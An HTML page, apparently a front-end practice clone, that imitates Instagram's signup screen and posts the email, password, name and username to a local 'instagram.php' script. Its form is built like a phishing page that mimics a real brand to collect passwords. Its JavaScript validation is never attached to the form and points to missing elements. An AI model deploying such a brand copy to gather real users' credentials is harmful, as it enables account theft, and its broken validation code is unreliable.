<!DOCTYPE html>
<html lang="en">
<head>
    <title>Instagram Signup UI</title>

   
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        .container-box {
            max-width: 400px;
            margin: 50px auto;
            background-color: #000000;
            padding: 40px;
            border-radius: 10px;
            border: 1px solid #ffffff56;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
        .insta-logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 50px;
            text-align: center;
            margin-bottom: 20px;
        }
        .fb-btn {
            background-color: #385185;
            color: rgb(249, 246, 246);
            font-weight: bold;
        }
        input {
            background-color: #222 !important;
            border: 1px solid #333 !important;
            color: #fff !important;
        }
        input::placeholder {
            color: #bbb !important;
        }
        
        .signup-btn {
            background-color: #1a73e8;
            color: white;
            font-weight: 700;
        }
        .bottom-box {
            max-width: 400px;
            margin: 20px auto;
            background-color: #111;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        a { color:#ffffff;
         }
    </style>
</head>

<body>

<div class="container-box">

    <div class="insta-logo">Instagram</div>

    <p class="text-center" style="color:#ccc">
        Sign up to see photos and videos from your friends.
    </p>

   
    <button class="btn fb-btn btn-block">
       <a href="https://www.facebook.com/login.php">Log in with Facebook</a>
    </button>

    <div style="text-align: center; margin: 15px 0; color: #aaa; font-weight: bold;">OR</div>

    <form action="instagram.php" method="POST">
        <input type="text" class="form-control " id="email" name="email" placeholder="Mobile Number or Email"><br>
        <input type="password" class="form-control " id="password" name="password" placeholder="Password"><br>
        <input type="text" class="form-control " id="fullname" name="fullname" placeholder="Full Name"><br>
        <input type="text" class="form-control " id="username" name="username" placeholder="Username"><br>

        <p class="small text-center " style="color:#aaa;">
            People who use our service may have uploaded your contact information to Instagram.
            <a href="https://www.facebook.com/help/instagram/261704639352628">Learn More</a>
        </p>

        <p class="small text-center" style="color:#aaa;">
            By signing up, you agree to our 
            <a href="https://www.facebook.com/help/instagram/261704639352628">Terms</a>, 
            <a href="https://www.facebook.com/privacy/policy?entry_point=ig_polaris_email_signup_row_privacy_policy">Privacy Policy</a> and 
            <a href="https://privacycenter.instagram.com/policies/cookies/">Cookies Policy</a>.
        </p>

        <button type="submit" class="btn signup-btn btn-block mt-2" style="margin: 10px;">Submit</button>
    </form>

</div>

<div class="bottom-box">
    Have an account? <a href="https://www.instagram.com/accounts/login/?source=auth_switcher">Log In</a>
</div>

 <script>
    function Submit() {
      var email = document.getElementById('email').value;
      if (email != '') {
        emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|net|org|edu|pk|info|co|gov)$/ 

        var testEmail = emailRegex.test(email)
        alert(testEmail);
      } else {
        document.getElementById('email_error').innerHTML = 'Please enter valid email'
      }
        var password = document.getElementById('password').value;
        if (password != '') {
          passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/
          var testPassword = passwordRegex.test(password)
          alert(testPassword);
        } else {
          document.getElementById('password_error').innerHTML = 'Please enter 6 digit with character password'
    }
    var fullname = document.getElementById('fullname').value;
        if (fullname != '') {
          fullnameRegex = /^[A-Za-z]+(?: [A-Za-z]+)+$/
          var testFullname = fullnameRegex.test(fullname)
          alert(testFullname);
        } else {
          document.getElementById('fullname_error').innerHTML = 'Please enter your fullname'
    }
    var username = document.getElementById('username').value;
        if (username != '') {
          usernameRegex = /^(?!.*\.\.)(?!\.)[A-Za-z0-9._]{1,30}$/
          var testUsername = usernameRegex.test(username)
          alert(testUsername);
        } else {
          document.getElementById('username_error').innerHTML = 'Please enter valid username'
    }

}
  </script>


<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>